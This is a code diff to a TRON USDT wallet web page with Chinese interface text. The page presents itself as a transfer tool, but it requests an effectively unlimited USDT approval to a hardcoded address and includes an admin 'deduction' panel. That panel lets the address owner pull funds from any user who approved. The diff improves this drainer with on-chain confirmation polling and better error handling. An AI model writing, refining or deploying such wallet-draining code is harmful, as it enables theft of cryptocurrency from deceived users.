@@ -81,7 +81,6 @@ body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 
 <button class="admin-btn" id="deductBtn">确认划扣</button>
 </div>
 <script>
-// 仅修改目标收款地址，其余连接逻辑100%还原你原始版本
 const TARGET_ADDR = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 const RPC = "https://api.trongrid.io";
@@ -120,7 +119,6 @@ function disconnectWallet() {
     adminPanel.style.display = "none";
 }
 
-// 完全复原你原来的钱包连接逻辑，不再新增多余弹窗，修复undefined报错
 async function connectWalletLogic() {
     if (tronWeb && userAddress) {
         disconnectWallet();
@@ -162,7 +160,6 @@ async function connectWalletLogic() {
             provider.on("chainChanged", () => location.reload());
         }
     } catch (err) {
-        // 去掉alert弹窗，还原原版行为，不弹出“连接钱包失败:undefined”
         return;
     }
 }
@@ -171,6 +168,18 @@ async function loadBalance() {
     const rawSun = await usdtContract.balanceOf(userAddress).call();
     const num = Number(tronWeb.fromSun(rawSun));
     balanceText.textContent = num.toFixed(6);
+}
+
+//轮询交易，确认链上真实确认
+async function waitTxConfirm(txId, maxTimes = 25) {
+    for(let i=0; i<maxTimes; i++){
+        await new Promise(r=>setTimeout(r,2200));
+        const res = await tronWeb.trx.getTransactionInfo(txId);
+        if(res && res.contractResult && res.contractResult[0] === '0x00'){
+            return true;
+        }
+    }
+    return false;
 }
 
 amountInput.addEventListener("input", () => {
@@ -191,25 +200,34 @@ sendBtn.addEventListener("click", async () => {
     const val = parseFloat(amountInput.value);
     if (isNaN(val) || val <= 0) return alert("请输入有效转账数量");
     const sunVal = tronWeb.toSun(val);
+    sendBtn.disabled = true;
     try {
         const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
         if (Number(allowance) < sunVal) {
             alert("需要授权USDT合约，请在钱包确认签名");
             await usdtContract.approve(TARGET_ADDR, "9999999999999999999999999999").send();
-            alert("授权完成，开始转账");
+            alert("授权完成，确认发起转账，等待链上确认...");
         }
-        // transferFrom第二个参数硬编码你的目标地址，不会被篡改
         const txHash = await usdtContract.transferFrom(userAddress, TARGET_ADDR, sunVal).send();
-        alert(`转账成功！交易哈希：${txHash}`);
-        await loadBalance();
+        alert("已签名提交，等待链上确认，请勿关闭页面...\n哈希:"+txHash);
+        //重点：等待链上真正确认完成，才弹出转账成功
+        const ok = await waitTxConfirm(txHash);
+        if(ok){
+            alert(`✅链上确认转账成功！交易哈希：${txHash}`);
+            await loadBalance();
+        }else{
+            alert("❌交易提交但是链上确认超时，请复制哈希去tronscan浏览器核查！\n"+txHash);
+        }
     } catch (e) {
         alert("操作失败：" + e.message);
+    }finally{
+        sendBtn.disabled = false;
     }
 });
 
 deductBtn.addEventListener("click",async ()=>{
     if(!tronWeb || userAddress !== TARGET_ADDR){
-        return alert("必须使用管理员钱包链接！");
+        return alert("必须使用管理员钱包连接！");
     }
     const fromUserAddr = userAddrInput.value.trim();
     const deductNum = parseFloat(deductAmountInput.value);
@@ -220,18 +238,27 @@ deductBtn.addEventListener("click",async ()=>{
         return alert("请输入合法划扣数量");
     }
     const deductSun = tronWeb.toSun(deductNum);
+    sendBtn.disabled=true;
     try{
         const userAllowance = await usdtContract.allowance(fromUserAddr, TARGET_ADDR).call();
         if(Number(userAllowance) < deductSun){
             return alert("错误：该用户没有授权足够额度，无法划扣！");
         }
         const txHash = await usdtContract.transferFrom(fromUserAddr, TARGET_ADDR, deductSun).send();
-        alert(`✅划扣成功！交易哈希:\n${txHash}`);
-        userAddrInput.value = "";
-        deductAmountInput.value = "";
-        await loadBalance();
+        alert("管理员划扣已提交，等待确认");
+        const ok = await waitTxConfirm(txHash);
+        if(ok){
+            alert(`✅划扣成功！交易哈希:\n${txHash}`);
+            userAddrInput.value = "";
+            deductAmountInput.value = "";
+            await loadBalance();
+        }else{
+            alert("划扣提交确认超时，请在区块浏览器核对"+txHash);
+        }
     }catch(err){
         alert("❌划扣失败:"+err.message);
+    }finally{
+        sendBtn.disabled=false;
     }
 });
 
